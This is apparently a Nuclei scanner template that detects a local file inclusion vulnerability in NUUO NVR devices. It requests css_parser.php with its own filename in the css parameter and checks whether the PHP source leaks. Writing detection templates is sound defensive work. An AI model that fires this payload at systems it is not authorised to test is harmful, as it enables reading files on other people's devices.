id: poc-yaml-nuuo-local-file-inclusion
info:
  name: NUUO NVR Local File Inclusion Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: lfi
http:
  - method: GET
    path:
      - "{{BaseURL}}/css_parser.php?css=css_parser.php"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "$_GET['css']"
      - type: word
        part: header
        words:
          - "text/css"
